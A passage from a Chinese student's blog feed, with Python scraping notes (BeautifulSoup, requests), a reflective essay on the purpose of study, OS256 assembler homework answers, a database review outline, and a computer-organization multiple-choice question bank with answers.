class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python">获取标签之间的文本数据:<br>- soup.a.text或者String或者get_text() <span class="hljs-comment">#两个属性,一个方法</span><br>区别:<br>- text或者get_text():可以获取某一个标签中所有的文本内容<br>- string:只可以获取该标签下面直系的文本内容<br><br>实例<span class="hljs-number">1</span>:<br>&gt;&gt;&gt; print(soup.select(<span class="hljs-string">&#x27;.tang &gt; ul a&#x27;</span>)[<span class="hljs-number">0</span>].get_text())<br>&gt;&gt;&gt; print(soup.select(<span class="hljs-string">&#x27;.tang &gt; ul a&#x27;</span>)[<span class="hljs-number">0</span>].text)<br>&gt;&gt;&gt; print(soup.select(<span class="hljs-string">&#x27;.tang &gt; ul a&#x27;</span>)[<span class="hljs-number">0</span>].string)<br><br>输出<span class="hljs-number">1</span>:<span class="hljs-string">&quot;清明时节雨纷纷,路上行人欲断魂,借问酒家何处有,牧童遥指杏花村.&quot;</span><br><span class="hljs-string">&quot;清明时节雨纷纷,路上行人欲断魂,借问酒家何处有,牧童遥指杏花村.&quot;</span><br><span class="hljs-string">&quot;清明时节雨纷纷,路上行人欲断魂,借问酒家何处有,牧童遥指杏花村.&quot;</span><br><br>实例<span class="hljs-number">2</span>:<br>&gt;&gt;&gt; soup.select(<span class="hljs-string">&#x27;.tang &#x27;</span>).text<br>&gt;&gt;&gt; soup.select(<span class="hljs-string">&#x27;.tang &#x27;</span>).string<br><br>输出<span class="hljs-number">2</span>:<span class="hljs-string">&quot;清明时节雨纷纷,路上行人欲断魂,借问酒家何处有,牧童遥指杏花村.&quot;</span><br><span class="hljs-string">&quot;秦时明月汉时关,万里长征人未还,但使龙城飞将在,不教胡马度阴山.&quot;</span><br><span class="hljs-string">&quot;岐王宅里寻常见,崔九堂前几度闻,正是江南好风景,落花时节又逢君.&quot;</span><br><span class="hljs-string">&quot;杜甫&quot;</span><br><span class="hljs-string">&quot;None&quot;</span><br><br>HTML部分文本(对应上述实例):<br>&lt;div class = &quot;tang&quot;&gt;<br>&lt;ul&gt;<br>&lt;li&gt;&lt;a href = &quot;http://www.baidu.com&quot; title = &quot;qing&quot;&gt;清明时节雨纷纷,路上行人欲断魂,借问酒家何处有,牧童遥指杏花村.&lt;/a&gt;&lt;/li&gt;<br>&lt;li&gt;&lt;a href = &quot;http://www.163.com&quot; title = &quot;qin&quot;&gt;秦时明月汉时关,万里长征人未还,但使龙城飞将在,不教胡马度阴山.&lt;/a&gt;&lt;/li&gt;<br>&lt;li&gt;&lt;a href = &quot;http://www.126.com&quot; alt = &quot;qi&quot;&gt;岐王宅里寻常见,崔九堂前几度闻,正是江南好风景,落花时节又逢君.&lt;/a&gt;&lt;/li&gt;<br>&lt;li&gt;&lt;a href = &quot;http://www.sina.com&quot; class = &quot;du&quot;&gt;杜甫&lt;/a&gt;&lt;/li&gt;<br>&lt;/ul&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">获取标签中属性值:<br>- soup.a[<span class="hljs-string">&#x27;href&#x27;</span>]<br><br>实例:<br>&gt;&gt;&gt; print(soup.select(<span class="hljs-string">&#x27;.tang &gt; ul a&#x27;</span>)[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;href&#x27;</span>])<br><br>输出:<span class="hljs-string">&quot;http://www.baidu.com&quot;</span><br><br></code></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫之request模块的学习</title>
      <link href="/2021/04/11/%E7%88%AC%E8%99%AB%E4%B9%8Brequest%E6%A8%A1%E5%9D%97%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/04/11/%E7%88%AC%E8%99%AB%E4%B9%8Brequest%E6%A8%A1%E5%9D%97%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><blockquote><p>统一资源定位符（英语：Uniform Resource Locator，缩写：URL；或称统一资源定位器、定位地址、URL地址，俗称网页地址或简称网址）是因特网上标准的资源的地址（Address），如同在网络上的门牌。它最初是由蒂姆·伯纳斯-李发明用来作为万维网的地址，现在它已经被万维网联盟编制为因特网标准RFC 1738.</p></blockquote><blockquote><p>requests模块：python中原生的一款基于网络请求的模块，功能非常强大，简单便捷，效率极高。</p></blockquote><p><strong>如何使用requests模块呢？</strong></p><ul><li>指定URL</li><li>发起请求</li><li>获取响应数据</li><li>持久化存储</li></ul><p><strong>环境安装：</strong></p><ul><li>pip install requests</li><li>利用pycharm，进入File-&gt;Settings-&gt;Project-&gt;Project Interpreter，安装</li><li>利用pycharm，新建.py文件，敲入 import requests，将光标移到红线上方，点击install安装</li></ul><p><strong>实战编码：</strong><br><a href="https://github.com/1905060202/chip/tree/master/test_project">胡小宁的github</a></p><ul><li>request_test1</li><li>request_test2</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>象牙塔里的思考</title>
      <link href="/2021/04/09/%E8%B1%A1%E7%89%99%E5%A1%94%E9%87%8C%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2021/04/09/%E8%B1%A1%E7%89%99%E5%A1%94%E9%87%8C%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h4 id="岁月无声。"><a href="#岁月无声。" class="headerlink" title="岁月无声。"></a>岁月无声。</h4><p>大一刚入学，就听闻教我们《离散数学》的老师是个在学术界叱诧风云的老教授。此人颇为奇怪，从不会阿谀奉承，是学院里为数不多的不带着院长发paper的人。<br>有一次在课上，学院领导催他去听一场国际前沿的讲座，只见他会心一笑，吸了一口到半截的香烟，说：“我就是国际前沿”。<br>有很多老师会点到，这是一种对我们的不信任，亦或许是对自身授课水平的不信任。何教授上课是从来都不会点到的，因为刚开课他就说过：“你们可以来，也可以不来，这是你们的事”。<br>后来，我就真的没再去听他的课了，不得不说，这是一种遗憾。<br>之所以提到何教授，是因为他的求学经历。<br>如果自己对一个人很崇拜，那就一定会去了解他。开课不久，我就查到了他的求学经历。先是在本校读的书，然后去了华南师范大学读硕士，接着去了中山大学读博士，又在苏州大学做了几年博士后。<br>看罢，我就开始幻想能同何教授一样一步步地爬上中国高等教育金字塔的顶端。<br>突然的，一个问题同墨滴入清水一般搅碎了我如痴如醉的幻想。读这么多书的意义何在呢？<br>我想起来自己高考前的心理，“只要能考上好大学，就一定要发个朋友圈好好炫耀一番！”<br>当时我真是这么想的，可以说贯穿了我整个高中思想的魑魅魍魉就是它。直到上大学，或者说再没遇到何教授之前，我还一直保持着这个想法。”我要考研，就是为了证明自己，同时发个朋友圈！“<br>高中我经常刷知乎，总会搜学习方法，逆袭经历，还有各种名牌大学的就读体验。每天晚上蹲坑都要拿手机刷半个小时甚至一个小时才出来，就觉得自己刷完了也能掌握高效的学习方法，<br>也能逆袭到第一名，甚至开始嫌弃某个名牌大学因为宿舍环境不好而不想报考了。<br>这就让我对自身产生了一种幻觉，觉得我本应如此，更何况我还深受一句话的影响：”我生来就是高山而非溪流，我欲于群峰之巅俯视平庸的沟壑。我生来就是人杰而非草芥，我站在伟人之肩藐视卑微的懦夫“。<br>老天是公平的，这种自欺欺人的懒惰的意淫的行为成了使我事与愿违的正当理由。<br>如今看来滑稽可笑的一切，都只是当初为了满足自己发朋友圈的幻想。但我想，这个世界上应该不止我有这种病态的想法。<br>归根溯源，发朋友圈的心理无非是想”炫耀“，而炫耀正是被朋友圈利用的人性的弱点。其实，找工作也好，考研也好，都希望自己能体面一些，而想被人看到自己很”体面“这背后，应该就是想炫耀和证明自己的心理。<br>说回何教授，在看完他的求学经历，我想到在他那个年代虽然没有朋友圈，但考上大学并且读到了名牌大学的博士，就已经是祖坟冒青烟的一件很体面的事了。即使没有朋友圈，<br>十里八乡的亲戚也会把这种事传开，从此家里人在村里会被”高看一眼“。<br>这种被”高看一眼“的心理，实际上就是许多人高考、考研、找工作内心的真实写照。<br>从上大学开始，家里就一直敦促我考研。舅舅当过行长，在阅历上我们一家人都没他丰富，所以报考时也咨询了他的建议。在得知我考入了一所不知名的一本院校时，他给出了最高级的指示，<br>让孩子考研！<br>于是就这样糊里糊涂的，也不知道为了什么努力，每天起床坚持背单词，一天最多背了一千五百多个，然后就糊里糊涂的在一年内考过了六级。其实想想我觉得自己挺牛逼的，哈哈。<br>就这样，有幸与何教授接触一学期后，自己在对求学这件事上有了些许的思考。<br> <strong>求学不是为了炫耀。</strong><br>后来我又接触过陈老师，尹老师，王老师，石老师。这些老师，哦不，应该称之为先生，启蒙了我的思想，让我真正开始思考人生的意义。<br>无论是读书还是工作，让自己保持激情的唯有热爱。这句话是石老师在课上随口而说的一句话，之所以说是随口一说，是因为他整节课都有段子和数不尽的包袱。这句话给了我极大的震撼，<br>让我开始思考自己是否热爱现在所学的专业。当初选择专业时，报考书上是这么形容大数据这个专业的：”既有前途，又有钱途“。我想这能给无数不知何去何从的年轻人指出一条充满希望的路。<br>我想到了小时候坐在电脑前的好奇，也想到了在高二闲暇之余敲出一个小游戏的振奋，还想到了报考前和父母因为专业选择问题舌战的那几个夜晚。<br>那一刻我恍然大悟，原来，<strong>求学是为了自己最纯粹的热爱。</strong><br>每个人都应该有家国情怀，之前抖音流行一个段子，好多大学生都在下面冷嘲热讽，只因为拍段子的人学历不高。内容大体上是这样的，一首小bgm响起，然后开始吟诵”为天地立心，为生民立命，为往圣继绝学，为万世开太平“。<br>诚然，求学的最高意义应该是为民族谋复兴，为国家谋进步。但具体到个人，就不必说的那么伟大了。<br>许多人在读研时会感到痛苦，我想原因就归咎于此吧。</p>]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OS256t3</title>
      <link href="/2021/03/08/OS256t3/"/>
      <url>/2021/03/08/OS256t3/</url>
      
        <content type="html"><![CDATA[<h2 id="操作系统OS256第三次作业"><a href="#操作系统OS256第三次作业" class="headerlink" title="操作系统OS256第三次作业"></a>操作系统OS256第三次作业</h2><p><img src="/images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%BB%E5%8A%A1%E4%B9%A63.png"></p><p>1.OS256使用什么语言开发？<br>    Javascript。<br>2.从源码来看，OS256由哪两个部分组成？<br>    软件和硬件。<br>    软件即汇编器，取名为assemble256。<br>    硬件，一台假想的机器，也叫虚拟机，名字为PC256。<br>3.请用”四分五列”详细说明assembler256的指令格式<br>    汇编指令=标号：指令助记符或伪指令  目的操作数，源操作数；注释<br>    伪指令(directive)：不生成机器指令，指导性语句。例如：DB UNTIL。并且伪指令是由汇编器定义的，而不是由CPU定义的。<br>    标号由最多8个英文字母组成，不区分大小写。<br>4.assembler256怎么知道一个字符串是标号？<br>    如果字符串后有冒号，那他就是标号。<br>5.为什么assembler256的指令里没有操作码？<br>    因为assembler256是汇编器，它使用的是伪指令，可汇编成操作码。<br>6.源操作数和目的操作数，谁在前，谁在后？<br>    目的操作数在前，源操作数在后。<br>7.你下载了VS CODE么？或者用了其它什么编辑器？<br>    vscode和webstorm<br>8.assembler256的源码在哪个文件里？PC256呢？<br>    assembler256源码在assets文件夹中的software.js文件里。<br>    PC256源码在assets文件夹中的hardware.js文件里。<br>9.伪指令和指令的区别是什么？<br>    指令是执行阶段发挥作用的，对应CPU可执行代码，编译时会分配存储单元。<br>    伪指令只是在编译阶段发挥作用，由汇编器来解释，编译时不会给分配存储单元，只是按伪指令的功能定位程序数据或指令位置。<br>10.操作数有哪4种类型？<br>    操作数有四种类型：<br>        (1).number类型 如0，1，100，255,标号<br>        (2).register类型 如A,B,C,D<br>        (3).number-address类型 如[0],[1],[2],[255]<br>        (4).register-address类型 如[A],[B],[C],[D]<br>11.在assembler256的汇编指令中，中括号的意义是什么？<br>    中括号表示要访问内存地址。（暂时不确定…）<br>12.UNTIL指令的效果是什么?<br>    从上一个位置填充0直到X为止。<br>13.DB指令有哪几种用法？<br>    （1）在当前位置定义一个字节 DB 7<br>    （2）在当前位置定义Y个X来填充当前位置 DB 13,9<br>    （3）在当前位置定义一个字符串 DB “HELLO”<br>    （4）在当前位置定义一个数组 DB [0,1,2,3,4,5,6,7,8,9]<br>14.LocationCounter的作用是什么？<br>    LocationCounter,简写为LC，位置计数器，表示当前code已用长度，初值为0.<br>15.标签数组label[]的作用是什么？<br>    存储标签，并记录标签所在位置。<br>16.标签出现在冒号的左边和右边，有什么不同？<br>    出现在左边就是标号，右边会语义出错。<br>17.code[256]和RAM[256]的联系和区别是什么？<br>    暂时空着…</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 作业 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库复习</title>
      <link href="/2021/01/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/"/>
      <url>/2021/01/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="HNUST-数据库系统复习"><a href="#HNUST-数据库系统复习" class="headerlink" title="HNUST 数据库系统复习"></a>HNUST 数据库系统复习</h2><p>数据库系统是计算机科班生必须拿捏的课程，而如果学习这门课，单单是为了应付考试，那么是掌握以下的复习要点，就足够了。<br><strong>但，人生不止一场数据库考试。</strong></p><p><img src="/images/%E6%95%B0%E6%8D%AE%E5%BA%931.jpg"><br>     <strong>数据库复习要点 图1</strong><br><img src="/images/%E6%95%B0%E6%8D%AE%E5%BA%932.jpg"><br>     <strong>数据库复习要点 图2</strong></p><blockquote><p>参考文献：2019级大数据二班YGN的总结</p></blockquote><h3 id="复习大纲"><a href="#复习大纲" class="headerlink" title="复习大纲"></a>复习大纲</h3><h4 id="一、绪论"><a href="#一、绪论" class="headerlink" title="一、绪论"></a>一、绪论</h4><ol><li>数据库的4个基本概念。只需要简要描述。</li><li>数据库管理系统的主要功能。只需要简要描述。</li><li>数据模型的层次。只需简要描述。</li><li>数据模型的组成要素。只需简要描述。</li><li>信息世界中的基本概念。掌握这些概念。</li><li>实体间联系的类型。需要熟练掌握。</li><li>关系模型的数据结构。理解相关术语。</li><li>数据库系统的三级模式结构。只需要理解并简要描述。</li><li>数据库的二级映像功能与数据独立性。只需要理解并简要描述。</li><li>数据库系统的组成，各类人员的职责。只需要简要描述。<h4 id="二、关系数据库"><a href="#二、关系数据库" class="headerlink" title="二、关系数据库"></a>二、关系数据库</h4></li><li>关系数据结构的形式化定义。掌握相关定义和记号。</li><li>关系的完整性。只需要理解并简要描述。</li><li>关系代数。需要熟练掌握各种运算并能综合运用。<h4 id="三、关系数据库语言"><a href="#三、关系数据库语言" class="headerlink" title="三、关系数据库语言"></a>三、关系数据库语言</h4></li><li>基本表的定义。需要熟练掌握。</li><li>索引的定义。需要熟练掌握。</li><li>数据查询。需要熟练掌握。</li><li>数据更新。需要熟练掌握。</li><li>视图的定义、查询和更新。需要熟练掌握。<h4 id="四、数据库的完整性和安全性"><a href="#四、数据库的完整性和安全性" class="headerlink" title="四、数据库的完整性和安全性"></a>四、数据库的完整性和安全性</h4></li><li>实体完整性的定义。需要熟练掌握。</li><li>参照完整性的定义。需要熟练掌握。</li><li>用户定义完整性的定义。需要熟练掌握。</li><li>触发器的定义。需要熟练掌握。</li><li>实现数据库安全控制的技术。只需简要描述。</li><li>常用的存取控制方法。只需要分类简要描述。</li><li>数据库的用户和角色。需要熟练掌握。</li><li>权限管理。需要熟练掌握。</li><li>视图机制。需要熟练掌握。<h4 id="五、关系模式的规范化"><a href="#五、关系模式的规范化" class="headerlink" title="五、关系模式的规范化"></a>五、关系模式的规范化</h4></li><li>函数依赖的定义和分类。需要熟练掌握。</li><li>码。需要熟练掌握，最好熟练掌握寻找候选码的算法。</li><li>各类范式的含义和判断。需要熟练掌握。</li><li>函数依赖的逻辑蕴涵。只需要初步理解。</li><li>Armstrong 公理系统。只需简要描述。</li><li>属性集的闭包。最好熟练掌握计算属性集闭包的算法。</li><li>函数依赖集的极小覆盖。最好熟练掌握计算函数依赖集的极小覆盖的算法。<h4 id="六、数据库设计"><a href="#六、数据库设计" class="headerlink" title="六、数据库设计"></a>六、数据库设计</h4></li><li>数据库设计的基本步骤。只需简要描述。</li><li>数据库设计各基本步骤的主要任务。只需简要描述。</li><li>E-R 模型。要求熟练使用。</li><li>E-R 图向关系模型的转换。需要熟练掌握。、<h4 id="七、事务处理"><a href="#七、事务处理" class="headerlink" title="七、事务处理"></a>七、事务处理</h4></li><li>事务的含义。只需简要描述。</li><li>事务的 ACID 特性。只需简要描述。</li><li>并发控制操作带来的问题。只需简要描述。</li><li>可串行调度。只需简要描述。</li><li>冲突可串行的调度。只需简要描述。</li><li>并发控制的主要技术。只需简要描述。</li><li>封锁的基本类型，封锁的粒度。只需简要描述。</li><li>活锁和死锁。只需简要描述。</li><li>故障的种类。只需简要描述。</li><li>数据库恢复的基本原理和具体实现方法。只需简要描述。</li><li>登记日志文件。需要熟练掌握。<h3 id="2021年数据库精讲习题"><a href="#2021年数据库精讲习题" class="headerlink" title="2021年数据库精讲习题"></a>2021年数据库精讲习题</h3><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B21.png"></li></ol><p><strong>习题选讲 1</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B22.png"><br><strong>习题选讲 2</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B23.png"><br><strong>习题选讲 3</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B24.png"><br><strong>习题选讲 4</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B25.png"><br><strong>习题选讲 5</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B26.png"><br><strong>习题选讲 6</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B27.png"><br><strong>习题选讲 7</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B28.png"><br><strong>习题选讲 8</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B29.png"><br><strong>习题选讲 9</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B210.png"><br><strong>习题选讲 10</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B211.png"><br><strong>习题选讲 11</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B212.png"><br><strong>习题选讲 12</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B213.png"><br><strong>习题选讲 13</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B214.png"><br><strong>习题选讲 14</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B214_2.png"><br><strong>习题选讲 14_2</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B215.png"><br><strong>习题选讲 15</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B215_2.png"><br><strong>习题选讲 15_2</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B216.png"><br><strong>习题选讲 16</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B216_2.png"><br><strong>习题选讲 16_2</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B217.png"><br><strong>习题选讲 17</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B217_2.png"><br><strong>习题选讲 17_2</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B217_3.png"><br><strong>习题选讲 17_3</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B218.png"><br><strong>习题选讲 18</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B218_2.png"><br><strong>习题选讲 18_2</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B219.png"><br><strong>习题选讲 19</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B220.png"><br><strong>习题选讲 20</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B220_2.png"><br><strong>习题选讲20_2</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B221.png"><br><strong>习题选讲21</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B221_2.png"><br><strong>习题选讲21_2</strong><br><img src="/images/%E4%B9%A0%E9%A2%98%E9%80%89%E8%AE%B222.png"><br><strong>习题选讲22</strong></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 习题 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理题库</title>
      <link href="/2021/01/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E9%A2%98%E5%BA%93/"/>
      <url>/2021/01/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E9%A2%98%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="HNUST计算机组成原理题库"><a href="#HNUST计算机组成原理题库" class="headerlink" title="HNUST计算机组成原理题库"></a>HNUST计算机组成原理题库</h2><p>胡小宁最近陷入了焦灼的状态，想必经历过大学期末考试的同学肯定能感同身受。</p><p>计算机组成原理是一片知识汪洋，如果各位同学在上课时<strong>没有认真听讲</strong>，或者在私下<strong>没有认真研读</strong>，那么在期末复习时，一定会毫无头绪。<br>好在，计算机学院每年都会在计算机组成原理的题库中选出一些题目作为期末考试的真题。</p><p>各位HNUST的同学有福了，本篇内容，将会提供题库中所有的习题供大家复习参考。</p><p><strong>因为本篇内容是在2021年初写的，日后题库肯定会有更新，想必彼时胡小宁已经离开学校了，无法继续更新内容。如果有师弟师妹愿意继续将这份事业做下去，请联系胡小宁。</strong></p><p><strong>2021年出题重点：</strong><br><img src="/images/2021%E5%B9%B4%E9%87%8D%E7%82%B9.jpg"></p><blockquote><p>参考文献：2019级大数据二班PPW的总结</p></blockquote><h3 id="一-单选题"><a href="#一-单选题" class="headerlink" title="一. 单选题"></a>一. 单选题</h3><p>（1）DMA访问主存时，向CPU发出请求，获得总线使用权时再进行访存，这种情况称作（B）。<br>    A.停止CPU访问主存 B.周期挪用<br>    C.DMA与CPU交替访问 D.DMA<br>（2）微程序存放在（B）中。<br>    A.存储器控制器 B.控制存储器<br>    C.主存储器 D.Cache<br>（3）CPU响应中断的时间是（B）。<br>    A.中断源提出请求 B.执行周期结束<br>    C.取指周期结束 D.间址周期结束<br>（4）常用的虚拟存储器寻址系统由（B）两级存储器组成。<br>    A.Cache-主存 B.主存-辅存 C.Cache-辅存 D.主存-硬盘<br>（5）计算机操作的最小单位时间是（C）。<br>    A.指令周期 B.CPU周期 C.时钟周期 D.中断周期<br>（6）总线通信中的同步控制是（B）。<br>    A.只适合于CPU控制的方式 B.由统一时序控制的方式<br>    C.只适合于外围设备控制的方式 D.只适合于主存<br>（7）同步控制是（C）。<br>    A.只适合于CPU控制的方式 B.只适合于外围设备控制的方式<br>    C.由统一时序信号控制的方式 D.所有指令控制时间都相同的方式<br>（8）某计算机字长是16位，它的存储容量是1MB，按字编址，它的寻址范围是（A）。<br>    A.512K B.1M C.512KB D.1MB<br>（9）主存和CPU之间增加Cache目的是（A）。<br>    A.解决CPU和主存之间的速度匹配问题 B.扩大主存容量<br>    C.既扩大主存容量，又提高了存取速度 D.扩大辅存容量<br>（10）以下叙述（A）是错误的。<br>    A.一个更高级的中断请求一定可以中断另一个中断处理程序的执行<br>    B.DMA和CPU必须分时使用总线<br>    C.DMA的数据传送不需CPU控制<br>    D.DMA中有中断机制<br>（11）Cache地址映像中，若主存中任一块均可映射到Cache内任一块位置上，称作（B）。<br>    A.直接映像 B.全相联映像 C.组相联映像<br>（12）微指令操作控制字段的每一位代表一个控制信号，这种微程序控制（编码）方式是（A）。<br>    A.直接控制法 B.最短编码法 C.字段直接编译法 D.字段间接编译法<br>（13）下列叙述中是正确的是（C）。<br>    A.程序中断方式中有中断请求，DMA方式中没有中断请求<br>    B.程序中断方式和DMA方式中实现数据传送都需中断请求<br>    C.程序中断方式和DMA方式都有中断请求，但目的不同<br>    D.DMA要等到指令周期结束时才进行周期窃取<br>(14) 在程序的执行过程中，Cache与主存的地址映象是由(  D   )。<br>    A．程序员调度的；                       B．操作系统管理的；<br>    C．由程序员和操作系统共同协调完成的；   D．硬件自动完成的。<br>(15) (  C  )对于实现程序浮动提供了较好的支持。<br>    A．间接寻址； B．变址寻址；C．相对寻址；D．直接寻址。<br>(16) 当定点运算发生溢出时，应( C  )。<br>    A．向左规格化；  B．向右规格化；C．发出出错信息；D．舍入处理。<br>(17) 在下述有关不恢复余数法何时需恢复余数的说法中，( B )是正确的。<br>    A．最后一次余数为正时，要恢复一次余数；<br>    B．最后一次余数为负时，要恢复一次余数；<br>    C．最后一次余数为0时，要恢复一次余数；<br>    D．任何时候都不恢复余数。<br>(18) 目前在小型和微型计算机里最普遍采用的字母与字符编码是( C )。<br>    A．BCD码；  B．十六进制代码； C．ASCII码；D．海明码。<br>(19)采用虚拟存储器的主要目的是(  B  )<br>    A.提高主存储器的存取速度          B.扩大主存储器的存储空间<br>    C.提高外存储器的存取速度          D.扩大外存储器的存储空间<br>(20) 主机与设备传送数据时，采用( A )，主机与设备是串行工作的。<br>    A．程序查询方式；  B．中断方式；   C．DMA方式；  D．通道<br>(21) 变址寻址方式中，操作数的有效地址是( C )。<br>    A．基址寄存器内容加上形式地址（位移量）；<br>    B．程序计数器内容加上形式地址；<br>    C．变址寄存器内容加上形式地址；<br>    D．以上都不对。<br>(22) 微程序控制器中，机器指令与微指令的关系是(  B  )。<br>    A. 每条机器指令由一条微指令来执行;<br>    B. 每一条机器指令由一段微指令编写的微程序来解释执行;<br>    C. 每一条机器指令组成的程序可由一条微指令来执行;<br>    D. 一条微指令由若干条机器指令组成。<br>(23) 在cache的映射方式中不需要替换策略的是（B）。<br>    A. 全相联映射方式   B. 直接映射方式 C. 组相联映射方式<br>(24) 冯.诺依曼机工作方式的基本特点是（ B ）。<br>    A．多指令流单数据流  B．按地址访问并顺序执行指令     C．堆栈操作<br>(25) 为了便于实现多级中断，保存中断现场最有效的方法是采用（B）。<br>    A. 通用寄存器    B. 堆栈      C. 存储器      D. 外存<br>(26) 若一台计算机的字长为4个字节，则表明（C）。<br>    A. 能处理的数值最大为4位十进制数<br>    B. 能处理的数值最多为4位二进制数组成<br>    C. 在CPU中能作为一个整体处理32位的二进制代码<br>    D. 在CPU中能运算的结果最大为2的32次方<br>(27) 某计算机存储器按字节编址，主存地址空间大小为64MB，现用4M×8位的RAM芯片组成32MB的主存储器，则存储器地址寄存器MAR的位数至少是（ B ）。<br>    A．22位   B．26位  C．25位   D．23位<br>(28) 变址寻址方式中，操作数的有效地址是（ B ）。<br>    A．基址寄存器内容加上形式地址（位移量）<br>    B．变址寄存器内容加上形式地址<br>    C．程序计数器内容加上形式地址<br>(29) 向量中断是（ C ）。<br>    A．外设提出中断；<br>    B．由硬件形成中断服务程序入口地址；<br>    C．由硬件形成向量地址，再由向量地址找到中断服务程序入口地址<br>(30) 隐指令是指（ D ）。<br>    A．操作数隐含在操作码中的指令；<br>    B．在一个机器周期里完成全部操作的指令；<br>    C．指令系统中已有的指令；<br>    D．指令系统中没有的指令。<br>(31)在中断周期中，由（ D ）将允许中断触发器置“0”。<br>     A．关中断指令；B．机器指令；C．开中断指令；D．中断隐指令。<br>(32)在微程序控制器中，一条机器指令的功能通常由（B）。<br>     A．一条微指令实现       B．一段微程序实现<br>     C．一个指令码实现       D．一个条件码实现<br>(33)若采用双符号位补码运算，运算结果的符号位为10，则（ A ）。<br>     A．产生了负溢出（下溢）       B．产生了正溢出（上溢）<br>     C．运算结果正确，为负数       D．运算结果正确，为正数<br>(34)采用DMA方式传送数据时，每传送一个数据要占用（ D ）的时间。<br>     A.一个指令周期 B.一个机器周期 C.一个时钟周期 D.一个存储周期<br>(35)以某个寄存器的内容为操作数地址的寻址方式称为（ D ）寻址。<br>     A．寄存器  B．相对   C．基址变址 D．寄存器间接<br>(36)微程序控制采用( C )。<br>    A.硬连线逻辑实现    B.组合逻辑电路实现<br>    C.存储逻辑实现       D.时序电路实现<br>(37)如果浮点数尾数用补码表示，则判断下列哪一项的运算结果是规格化数 ( C )。<br>    A.11000    B.0.01110  